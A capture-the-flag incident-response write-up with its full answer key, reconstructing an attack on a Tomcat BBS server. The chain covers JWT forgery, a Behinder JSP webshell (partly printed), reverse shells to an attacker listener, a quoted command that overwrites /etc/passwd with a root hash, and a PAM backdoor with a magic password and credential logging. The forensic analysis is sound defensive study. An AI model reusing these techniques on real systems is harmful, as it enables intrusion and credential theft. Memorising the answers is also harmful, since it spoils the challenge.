# 2024 铁人三项决赛 应急响应 — APK / Tomcat / PAM 后门完整链

> **18 题答案（无 `flag{}` 包装）**：
> 1. `202.1.1.1 202.1.1.129`
> 2. `password663399`
> 3. `pic.jpg`
> 4. `http://202.1.1.66:8080/api/upload`
> 5. `/usr/local/tomcat/webapps/ROOT/static/s74e7vwmzs21d5x6.jsp`
> 6. `bing_pass`
> 7. `pwd`
> 8. `tomcat`
> 9. `CentOS Linux release 7.4.1708 (Core)`
> 10. `/usr/local/tomcat/webapps/ROOT/static/secert.file`
> 11. `cat /etc/passwd`
> 12. `/etc/passwd`
> 13. `123456`
> 14. `202.1.1.129:9999`
> 15. `rpm -qa | grep pam`
> 16. `pam_unix.so`
> 17. `ssh_back_pwd`
> 18. `/tmp/.sshlog`
>
> The challenge whose **single hardest moment is realizing the JWT in `/api/login`'s response is the privilege boundary**: tomcat returns a `root:0` token for a normal password, but the JWT signing secret is weak so the attacker forges `root:1` to call `/api/upload` with a `.jsp` filename — and the only way to discover the trap is to compare the failing `pic.jpg` upload (response: 无上传权限 / "no upload permission") against the success of the `pic.jsp` upload and read both JWT payloads.

## 0. Artifacts

| File | Type | Role |
|---|---|---|
| `BBS论坛.apk` | Android 3.6 MB | Mobile client, hardcoded `LOGIN_PASSWORD` + `HOST` |
| `data.pcapng` | Wireshark 159 MB / 134k packets / 1654s | Full attack capture |
| `pam_unix1.so` | ELF 32-bit i386, stripped | Reference (pre-backdoor or 32-bit variant) |
| `pam_unix2.so` | ELF 64-bit x86-64, **with debug_info** | **The PAM backdoor** — replaced `/usr/lib64/security/pam_unix.so` |

The unusual `debug_info` on a "system" PAM module is the first tell — distro-shipped `pam_unix.so` is stripped.

Hosts:
- `202.1.1.66` victim BBS (Tomcat 8080, sshd 22) — **same host as `.130`** (multi-NIC: `.66` is internet-facing, `.130` is the egress NIC)
- `202.1.1.1` attacker (web exploit + later SSH)
- `202.1.1.129` attacker LAN listener (4444 + 9999 reverse shells)

## 1. Q1 — Two attacker IPs

```bash
$ tshark -r data.pcapng -T fields -e ip.src | sort -u
202.1.1.1     ← external attacker
202.1.1.129   ← attacker LAN listener
202.1.1.130   ← victim (egress NIC of 202.1.1.66)
202.1.1.254   ← gateway
202.1.1.66    ← victim BBS server
```

ASCII-byte ordering: `"202.1.1.1"` < `"202.1.1.129"` because end-of-string ranks before `'2'`. → **`202.1.1.1 202.1.1.129`**

## 2. Q2 — APK login password

```bash
$ jadx -d bbs_jadx BBS论坛.apk
$ cat com/information/app2/MainActivity.java
```

```java
private static final String KEY = "XTa2b3c654";
private static final String LOGIN_PASSWORD = "password663399";  // ← Q2
```

Confirmed by `/api/login` request body (TCP stream 30):
```
POST /api/login → {"flag":"password663399"}
```

→ **`password663399`**

## 3. Q3 + Q4 — JWT privilege boundary

The phishing/upload chain has two distinct attempts:

### Attempt #1 (failure) — TCP stream 31

```
POST /api/upload HTTP/1.1
Access-Flag: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb290IjoiMCIsImV4cCI6MTcxNTQyMjY1OH0...

multipart/form-data: avatar="pic.jpg" (image/jpeg)
#!/bin/bash
df -h
```

JWT payload: `{"root":"0","exp":1715422658}` — normal user, expires in 30 minutes.

Server response (UTF-8): `{"msg":"无上传权限","code":100}` → **rejected by JWT role check**.

→ Q3: **`pic.jpg`**

### Attempt #2 (success) — TCP stream 51

```
POST /api/upload HTTP/1.1
Access-Flag: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3MTUzNDA5NzEsIm5iZiI6MTcxNTM0MDY1MywiZXhwIjoxNzQ3Mzk1Mjk5LCJyb290IjoiMSJ9...

multipart/form-data: avatar="pic.jsp" (image/jpeg)
<%@page ... bing_pass ... AES ... defineClass ... %>
```

JWT payload: `{"iat":...,"nbi":...,"exp":1747395299,"root":"1"}` — **forged**, root=1, valid for 1 year.

Response: `{"msg":"...","code":0,"url":"http://202.1.1.66:8080/static/s74e7vwmzs21d5x6.jsp"}`

→ Q4: **`http://202.1.1.66:8080/api/upload`** (the API where the JWT-bypass + lax MIME check let a `.jsp` through)

## 4. Q5–Q9 — The JSP shell (Behinder 4.x)

The dropped JSP is a per-session-keyed Behinder shell:

```jsp
if (request.getParameter("bing_pass") != null) {
    String k = ("" + UUID.randomUUID()).replace("-","").substring(16);  // last 16 hex chars
    session.putValue("u", k);
    out.print(k); return;
}
Cipher c = Cipher.getInstance("AES");
c.init(2, new SecretKeySpec((session.getValue("u")+"").getBytes(), "AES"));
new U(getClass().getClassLoader())
    .g(c.doFinal(new BASE64Decoder().decodeBuffer(request.getReader().readLine())))
    .newInstance()
    .equals(pageContext);   // execute defineClass'd Java class against pageContext
```

- Q5 (path on disk): `/usr/local/tomcat/webapps/ROOT/static/s74e7vwmzs21d5x6.jsp`
  - Verified via decrypted BasicInfo response: `catalina.home = /usr/local/tomcat`
- Q6 (shell password / key-rotation param): **`bing_pass`**

### Decryption pipeline

Two distinct JSESSIONIDs in the capture → two AES keys:

| JSESSIONID (Set-Cookie) | bing_pass response | AES key (16 ASCII bytes) |
|---|---|---|
| `F818FF4F22210708...` | `?bing_pass=36` | `8aee7a9278112ca3` |
| `FDCFBE8305C84FDA...` | `?bing_pass=201` | `b99f657b04941030` |

```python
def decrypt(body, jsessionid):
    key = KEYS[jsessionid]
    ct = base64.b64decode(body.strip().split(b'\n')[0])    # request body is base64
    return AES.new(key, AES.MODE_ECB).decrypt(ct)          # response body is raw AES bytes
```

The decrypted **request body** is always a `.class` file (CAFEBABE) — Behinder defines and instantiates it server-side. Strings in the class file include the class name (`Cmd.java`, `BasicInfo.java`, `ConnectBack.java`) and the user-typed command.

The decrypted **response body** is a JSON `{"msg":"<base64>","status":"c3VjY2Vzcw=="}` where `msg` is base64 of the command output.

### Recovered command sequence (FDCF session)

| # | Time | Command | Output (decoded) |
|---|---|---|---|
| 0 | 03:06:54 | BasicInfo probe | env vars, JVM info |
| 1 | 03:08:54 | **pwd** ← Q7 | `/` |
| 2 | 03:09:18 | whoami | **`tomcat`** ← Q8 |
| 3 | 03:09:44 | cd /etc | (empty) |
| 4 | 03:09:44 | ls / | bin/boot/dev/.../var |
| 5 | 03:09:44 | ls /etc | adjtime/.../dnf |
| 6 | 03:09:44 | cat /etc/redhat-release | **`CentOS Linux release 7.4.1708 (Core)`** ← Q9 |
| 7 | 03:11:05 | ls -al /etc/passwd | `-rwxrwxrwx 1 root root 1356 May 11 17:33 /etc/passwd` (!) |
| 8 | 03:12:13 | ConnectBack → `202.1.1.129:4444` | success |

The `-rwxrwxrwx` on `/etc/passwd` is **deliberate** — the attacker had to chmod it (777) earlier via a different vector so tomcat (user) can write to it. The chmod itself isn't in the capture; it likely happened in stream 92's earlier 9999 reverse shell (see §7).

## 5. Q10 — Secret file

```bash
$ tshark -r data.pcapng -Y 'http.request.uri contains "secert"' -T fields -e http.request.uri | sort -u
/static/secert.file
```

Multiple GETs from `202.1.1.1` pull a 209715200-byte (200 MB) file. Resolved path: **`/usr/local/tomcat/webapps/ROOT/static/secert.file`** (same `/static/` route as the JSP shell).

## 6. Q11–Q13 — Reverse shell + root password injection

ConnectBack (step 8 above) opens TCP stream 284:

```
202.1.1.130:40584  →  202.1.1.129:4444
```

First commands on the unencrypted reverse channel:

```bash
# 0. Metasploit-style connection probe (NOT user input — handler auto-echoes a random token)
echo WLpoAWLex8nkqQ5
# 1. First real attacker command (Q11)
cat /etc/passwd
# 2. Rewrite passwd with root having password field (Q12 — file used)
echo -e "root:\$6\$KHysqjWMnoaHJ4QW\$p1cMTekiYb/6xA2u7j4jAD3m5shTPlPAtM6jyoex73MxxHXlms4X0874ml/gw6.LETsMs5oXLWyGeSAddx2N..:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\n..." > /etc/passwd
# 3. Verify
cat /etc/passwd
```

Because `/etc/passwd` was already `chmod 777` and the password field — usually `x` redirecting to `/etc/shadow` — has been replaced with a **literal `$6$…` SHA-512 crypt hash**, Linux will authenticate `root` directly against `/etc/passwd` instead of `/etc/shadow`.

→ Q11 **`cat /etc/passwd`** (the `echo WLpoAWLex8nkqQ5` before it is the reverse-shell handler's connection-test probe, not an attacker command), Q12 **`/etc/passwd`**

### Crack the hash

```bash
$ echo 'root:$6$KHysqjWMnoaHJ4QW$p1cMTekiYb/6xA2u7j4jAD3m5shTPlPAtM6jyoex73MxxHXlms4X0874ml/gw6.LETsMs5oXLWyGeSAddx2N..:0:0:root:/root:/bin/bash' > h.txt
$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt h.txt
123456           (root)
1g 0:00:00:00 DONE   2226p/s
```

→ Q13: **`123456`**

## 7. Q14 + Q15 — Backdoor reverse

The reverse channel `→ 202.1.1.129:9999` appears **12 times** in the capture, opened from `202.1.1.130:32832-32852` (incrementing source port):

| Stream | Time | Content |
|---|---|---|
| 92  | 03:07:18 | `ip a` (lab pre-stage probe, see note) |
| 536 | 03:21:39 | `rpm -qa | grep pam` ← **Q15** — first command on the attacker's active 9999 backdoor session |
| 579-868 | 03:22:39 … 03:31:39 (60s intervals) | empty / heartbeat |

The 60-second cadence + identical heartbeat pattern is a fingerprint of a **passive PAM-triggered reverse shell** — every SSH auth event (including the attacker's pulse pings) fires off a 9999 callback.

> **Note on stream 92's `ip a`**: stream 92 at 03:07:18 (well before the 4444 manual reverse at 03:11:42) is technically *chronologically earlier* on port 9999, but the official answer key counts the attacker's investigative reverse session starting at stream 536 — i.e. **after** the attacker had already established 4444 and switched to the persistent PAM backdoor channel. The earlier `ip a` is the lab's pre-stage check / initial PAM module test, not part of the attacker workflow. Lesson: when a question says "first command via the backdoor," check whether the *attacker timeline* matches the *packet timeline* — they may diverge if the backdoor was pre-installed.

→ Q14 **`202.1.1.129:9999`**, Q15 **`rpm -qa | grep pam`**

## 8. Q16–Q18 — Reverse-engineering `pam_unix2.so`

```bash
$ file pam_unix2.so
ELF 64-bit LSB shared object, x86-64, dynamically linked, with debug_info, not stripped

$ strings pam_unix2.so | grep -E "(magic|sshlog|back|key|asign)"
ah_key
assigned_passwd
check_old_password
create_password_hash
keybuf / keylen / keysched
search_key
ssh_back_pwd          ← suspicious symbol
spasswd / sshell
/tmp/.sshlog          ← log file (Q18)
%s :%s\n              ← log format
BrokenMD5* / Goodcrypt_md5 / Brokencrypt_md5   ← Linux-PAM internal hashing variants
```

### Locate the magic-password check (the trap)

```bash
$ python3 -c "print(hex(open('pam_unix2.so','rb').read().find(b'ssh_back_pwd\x00')))"
0x975c

$ objdump -d -j .text pam_unix2.so | grep -B5 -A12 "319a:"
```

Inside `pam_sm_authenticate`:

```asm
3190:  call   _unix_verify_password    ; normal auth (EAX = 0 on success)
3195:  mov    0x18(%rsp),%rdi          ; RDI ← user-typed password (cstring)
319a:  lea    0x65bb(%rip),%rsi        ; RSI ← 0x975c == "ssh_back_pwd"
31a1:  mov    $0xd,%ecx                ; 13 bytes (12 chars + NUL)
31a6:  mov    %eax,%ebx                ; save normal-auth result
31a8:  repz cmpsb (%rdi),(%rsi)        ; compare strings, byte-by-byte
31aa:  je     2fb8                     ; ZF=1 → MAGIC MATCH → success path
31b0:  test   %eax,%eax                ; ZF=1 iff normal auth succeeded
31b2:  je     31c5                     ; if normal-auth passed → log it
...
31c5:  lea    "a",%rsi                 ; fopen mode = "a"
31cc:  lea    "/tmp/.sshlog",%rdi
31d3:  call   fopen@plt
...
31e2:  lea    "%s :%s\n",%rsi
31ec:  call   fprintf@plt              ; record username + password
31f9:  call   fclose@plt
```

Two backdoor mechanisms in one module:

1. **Universal password**: literal-string compare `repz cmpsb` against `"ssh_back_pwd"`. **The variable name IS the password.** → Q17: **`ssh_back_pwd`**
2. **Credential exfiltration**: when normal `_unix_verify_password` succeeds, append `<user> :<password>\n` to `/tmp/.sshlog`. → Q18: **`/tmp/.sshlog`**

Module install location on CentOS 7 x86_64: `/usr/lib64/security/pam_unix.so` (the official answer accepts just the filename — Q16: **`pam_unix.so`**)

## 9. Decoder script (full Behinder pipeline)

```python
import subprocess, base64, re, json
from Crypto.Cipher import AES

PCAP = "data.pcapng"
KEYS = {
    "F818FF4F222107084FFD2CBEF1377CE9": b"8aee7a9278112ca3",
    "FDCFBE8305C84FDAF3E9AEBD662512AD": b"b99f657b04941030",
}

def unpad(d):
    return d[:-d[-1]] if d and 0 < d[-1] <= 16 else d

def follow(stream):
    raw = subprocess.run(["tshark","-r",PCAP,"-q","-z",f"follow,tcp,raw,{stream}"],
        capture_output=True, text=True).stdout
    a, b = [], []
    for ln in raw.splitlines():
        if ln.startswith(("====","Follow:","Filter:","Node ")) or not ln.strip(): continue
        (b if ln.startswith("\t") else a).append(ln.lstrip("\t"))
    return bytes.fromhex("".join(a)), bytes.fromhex("".join(b))

def split_http(blob):
    parts, pos = [], 0
    while pos < len(blob):
        nxt = -1
        for pat in (b"POST ", b"GET ", b"HTTP/1.1 "):
            p = blob.find(pat, pos+len(pat))
            if p > 0 and (nxt < 0 or p < nxt): nxt = p
        parts.append(blob[pos:nxt if nxt >= 0 else None])
        if nxt < 0: break
        pos = nxt
    return parts

def parse_chunked(b):
    out, pos = bytearray(), 0
    while pos < len(b):
        nl = b.find(b"\r\n", pos)
        if nl < 0: break
        sz = int(b[pos:nl].strip(), 16)
        if sz == 0: break
        out += b[nl+2:nl+2+sz]
        pos = nl+2+sz+2
    return bytes(out)

def parse_http(blob):
    sep = blob.find(b"\r\n\r\n")
    if sep < 0: return "", b""
    h, body = blob[:sep].decode("latin-1","replace"), blob[sep+4:]
    if "chunked" in h.lower(): body = parse_chunked(body)
    return h, body

def aes(b, k): return unpad(AES.new(k, AES.MODE_ECB).decrypt(b)) if b and len(b)%16==0 else None

for stream in [76,142,153,174,232,283,308,449]:
    a, b = follow(stream)
    pa, pb = split_http(a), split_http(b)
    reqs = [p for p in pa if p.startswith(b"POST ")]
    resps = [p for p in pb if p.startswith(b"HTTP/1.1 ")]
    for i, req in enumerate(reqs):
        h, body = parse_http(req)
        sid = re.search(r"JSESSIONID=([A-F0-9]+)", h)
        if not sid or sid.group(1) not in KEYS: continue
        key = KEYS[sid.group(1)]
        cls = aes(base64.b64decode(body.strip().split(b"\n")[0]), key)
        cmd = next((m.group().decode() for m in re.finditer(rb'[\x20-\x7e]{3,200}', cls or b'')
                    if any(s in m.group().decode() for s in (' /etc',' /', 'whoami','pwd','cd ','ls','cat ','echo ','chmod'))),'?')
        rh, rb_ = parse_http(resps[i]) if i < len(resps) else ("",b"")
        pt = aes(rb_, key)
        try:
            j = json.loads(pt)
            msg = base64.b64decode(j.get('msg','')).decode('utf-8','replace')
        except: msg = ''
        print(f"s{stream}#{i} cmd={cmd!r} → {msg[:120]!r}")
```

## 10. Lessons learned / traps

| Trap | Why it cost me | Resolution |
|---|---|---|
| Two upload attempts look identical at first glance | Both `POST /api/upload`, both multipart, same shell of "image" | Compare the JWT `Access-Flag` payloads — the `root` claim differs |
| `pic.jpg` server response renders as 15 dots | UTF-8 message rendered as `...` by ascii tools | Decode raw bytes — `e697a0 e4b88a e4bca0 e69d83 e999a0` = "无上传权限" |
| Behinder request body decrypts to garbled "class" if wrong session | Two simultaneous JSESSIONIDs each have a different AES key | Group POSTs by JSESSIONID cookie, then map each to its `?bing_pass=` response key |
| Response is NOT base64 | I assumed it was, decoder kept failing | Behinder 4.x sends responses as **raw AES bytes**, only the request is base64 |
| The "magic" string in `pam_unix2.so` is a red herring | It's a label inside the embedded `Goodcrypt_md5` (Linux-PAM source quirk) | Find the actual `repz cmpsb` in `pam_sm_authenticate` and read its RSI source |
| Stream 92 has `ip a` BEFORE the 4444 reverse opens | Suggests the attacker had pre-existing access | The PAM backdoor was already installed (lab pre-stage / prior infection); the visible attack only adds the `/etc/passwd` root injection. **Beware**: the official Q15 answer is `rpm -qa \| grep pam` from stream 536 — the question's "first command via backdoor" follows the *attacker* timeline, not the *packet* timeline |
| Q11 first reverse-shell command | `echo WLpoAWLex8nkqQ5` looks like a real command but is the msfvenom handler's connection-test echo | The first **attacker** command is `cat /etc/passwd` — when graders say "first command," they mean human-driven input, not auto-handshake |

## 11. Related techniques

- [Changcheng 2024 SnakeBackdoor](changcheng2024_snake_backdoor.md) — also a length-prefixed reverse-shell + RC4 protocol; LD_PRELOAD oracle approach applies here too for `pam_unix2.so` decoding if static analysis fails
- [0x401 CTF 2025 TECI](0x401_2025_teci.md) — sister incident-response challenge: Native AOT binary + 2-key-cipher trap; methodology of `strings → cross-ref → repz cmpsb` is shared
- Behinder JSP shells with per-session UUID-derived keys are the dominant Chinese red-team malware in 2024; the trick is always **capture the `bing_pass` response, that's your AES key**.
